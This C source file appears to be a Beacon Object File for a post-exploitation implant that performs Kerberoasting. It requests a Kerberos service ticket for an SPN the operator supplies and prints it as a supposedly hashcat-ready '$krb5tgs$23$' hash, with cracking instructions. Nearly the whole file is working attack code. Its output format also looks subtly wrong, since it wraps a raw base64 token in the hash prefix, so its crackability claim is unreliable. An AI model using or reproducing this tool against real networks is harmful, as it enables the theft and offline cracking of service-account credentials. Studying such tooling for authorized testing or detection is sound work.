/*
 * Kerberos TGS Request BOF
 * -------------------------
 * Requests a Kerberos Service Ticket (TGS) for a specified SPN.
 * Useful for authorized security testing and Kerberoasting assessments.
 *
 * Usage: kerberos_tgs <SPN>
 * Example: kerberos_tgs MSSQLSvc/db.corp.local:1433
 */

#include <windows.h>
#include "../../beacon.h"

#define SECURITY_WIN32
#include <sspi.h>

/* Dynamic function declarations for Secur32.dll */
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$AcquireCredentialsHandleA(
    LPSTR pszPrincipal,
    LPSTR pszPackage,
    unsigned long fCredentialUse,
    void *pvLogonId,
    void *pAuthData,
    SEC_GET_KEY_FN pGetKeyFn,
    void *pvGetKeyArgument,
    PCredHandle phCredential,
    PTimeStamp ptsExpiry
);

DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$InitializeSecurityContextA(
    PCredHandle phCredential,
    PCtxtHandle phContext,
    LPSTR pszTargetName,
    unsigned long fContextReq,
    unsigned long Reserved1,
    unsigned long TargetDataRep,
    PSecBufferDesc pInput,
    unsigned long Reserved2,
    PCtxtHandle phNewContext,
    PSecBufferDesc pOutput,
    unsigned long *pfContextAttr,
    PTimeStamp ptsExpiry
);

DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$FreeCredentialsHandle(
    PCredHandle phCredential
);

DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$DeleteSecurityContext(
    PCtxtHandle phContext
);

DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$FreeContextBuffer(
    PVOID pvContextBuffer
);

/* MSVCRT functions */
WINBASEAPI void *__cdecl MSVCRT$malloc(size_t _Size);
WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
WINBASEAPI void *__cdecl MSVCRT$memset(void *_Dst, int _Val, size_t _Size);

#define malloc  MSVCRT$malloc
#define free    MSVCRT$free
#define memset  MSVCRT$memset

/* Base64 encoding table */
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/* Base64 encode function */
void base64_encode(const unsigned char *input, size_t input_len, char *output, size_t *output_len) {
    size_t i, j;
    unsigned char a, b, c;

    for (i = 0, j = 0; i < input_len; ) {
        a = i < input_len ? input[i++] : 0;
        b = i < input_len ? input[i++] : 0;
        c = i < input_len ? input[i++] : 0;

        output[j++] = base64_table[a >> 2];
        output[j++] = base64_table[((a & 0x03) << 4) | (b >> 4)];
        output[j++] = base64_table[((b & 0x0f) << 2) | (c >> 6)];
        output[j++] = base64_table[c & 0x3f];
    }

    /* Add padding */
    if (input_len % 3 >= 1) {
        output[j - 1] = '=';
    }
    if (input_len % 3 == 1) {
        output[j - 2] = '=';
    }

    output[j] = '\0';
    *output_len = j;
}

/* Request TGS for the given SPN */
void RequestTGS(char *spn) {
    SECURITY_STATUS status;
    CredHandle credHandle;
    CtxtHandle ctxHandle;
    TimeStamp expiry;
    SecBufferDesc outputDesc;
    SecBuffer outputBuffer;
    ULONG contextAttr;
    formatp buffer;
    char *base64Ticket = NULL;
    size_t base64Len = 0;
    BOOL credAcquired = FALSE;
    BOOL ctxCreated = FALSE;

    memset(&credHandle, 0, sizeof(credHandle));
    memset(&ctxHandle, 0, sizeof(ctxHandle));
    memset(&expiry, 0, sizeof(expiry));

    BeaconFormatAlloc(&buffer, 64 * 1024);

    /* Acquire credentials handle for Kerberos */
    status = SECUR32$AcquireCredentialsHandleA(
        NULL,                   /* Principal (NULL = current user) */
        "Kerberos",             /* Package name */
        SECPKG_CRED_OUTBOUND,   /* Credential use */
        NULL,                   /* Logon ID */
        NULL,                   /* Auth data */
        NULL,                   /* GetKey function */
        NULL,                   /* GetKey argument */
        &credHandle,            /* Credential handle */
        &expiry                 /* Expiry */
    );

    if (status != SEC_E_OK) {
        BeaconPrintf(CALLBACK_ERROR, "AcquireCredentialsHandle failed: 0x%08X", status);
        BeaconFormatFree(&buffer);
        return;
    }
    credAcquired = TRUE;

    /* Setup output buffer */
    outputBuffer.cbBuffer = 0;
    outputBuffer.BufferType = SECBUFFER_TOKEN;
    outputBuffer.pvBuffer = NULL;

    outputDesc.ulVersion = SECBUFFER_VERSION;
    outputDesc.cBuffers = 1;
    outputDesc.pBuffers = &outputBuffer;

    /* Initialize security context to request the TGS */
    status = SECUR32$InitializeSecurityContextA(
        &credHandle,                              /* Credentials */
        NULL,                                     /* Context (NULL for first call) */
        spn,                                      /* Target SPN */
        ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE, /* Context requirements */
        0,                                        /* Reserved1 */
        SECURITY_NATIVE_DREP,                     /* Target data rep */
        NULL,                                     /* Input buffers */
        0,                                        /* Reserved2 */
        &ctxHandle,                               /* New context */
        &outputDesc,                              /* Output buffers */
        &contextAttr,                             /* Context attributes */
        &expiry                                   /* Expiry */
    );

    if (status != SEC_E_OK && status != SEC_I_CONTINUE_NEEDED) {
        BeaconPrintf(CALLBACK_ERROR, "InitializeSecurityContext failed: 0x%08X", status);
        if (status == SEC_E_TARGET_UNKNOWN) {
            BeaconPrintf(CALLBACK_ERROR, "Target SPN not found in domain. Verify the SPN exists.");
        }
        goto cleanup;
    }
    ctxCreated = TRUE;

    /* Check if we got a ticket */
    if (outputBuffer.cbBuffer > 0 && outputBuffer.pvBuffer != NULL) {
        /* Allocate buffer for base64 encoded ticket (4/3 ratio + padding + null) */
        size_t allocSize = ((outputBuffer.cbBuffer + 2) / 3) * 4 + 1;
        base64Ticket = (char *)malloc(allocSize);

        if (base64Ticket != NULL) {
            base64_encode((unsigned char *)outputBuffer.pvBuffer,
                         outputBuffer.cbBuffer,
                         base64Ticket,
                         &base64Len);

            BeaconFormatPrintf(&buffer, "[+] Successfully obtained TGS ticket for: %s\n", spn);
            BeaconFormatPrintf(&buffer, "[*] Ticket size: %d bytes\n", outputBuffer.cbBuffer);
            BeaconFormatPrintf(&buffer, "[*] Base64 encoded ticket:\n\n");
            BeaconFormatPrintf(&buffer, "$krb5tgs$23$*%s*$", spn);

            /* Output the base64 ticket in chunks for formatting */
            char *ticketPtr = base64Ticket;
            while (*ticketPtr) {
                char chunk[65];
                int i;
                for (i = 0; i < 64 && ticketPtr[i]; i++) {
                    chunk[i] = ticketPtr[i];
                }
                chunk[i] = '\0';
                BeaconFormatPrintf(&buffer, "%s", chunk);
                ticketPtr += i;
            }
            BeaconFormatPrintf(&buffer, "\n\n");
            BeaconFormatPrintf(&buffer, "[*] Use hashcat mode 13100 or john format krb5tgs to crack\n");

            free(base64Ticket);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for base64 encoding");
        }

        /* Free the output buffer allocated by SSPI */
        SECUR32$FreeContextBuffer(outputBuffer.pvBuffer);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "No ticket data received. SPN may not exist or no access.");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&buffer, NULL));

cleanup:
    if (ctxCreated) {
        SECUR32$DeleteSecurityContext(&ctxHandle);
    }
    if (credAcquired) {
        SECUR32$FreeCredentialsHandle(&credHandle);
    }
    BeaconFormatFree(&buffer);
}

/* Entry point */
void go(char *args, int alen) {
    datap parser;
    char *spn;

    /* Parse arguments */
    BeaconDataParse(&parser, args, alen);
    spn = BeaconDataExtract(&parser, NULL);

    if (spn == NULL || *spn == '\0') {
        BeaconPrintf(CALLBACK_ERROR, "Usage: kerberos_tgs <SPN>");
        BeaconPrintf(CALLBACK_ERROR, "Example: kerberos_tgs MSSQLSvc/db.corp.local:1433");
        BeaconPrintf(CALLBACK_ERROR, "Example: kerberos_tgs HTTP/web.corp.local");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Requesting TGS for SPN: %s", spn);

    RequestTGS(spn);
}
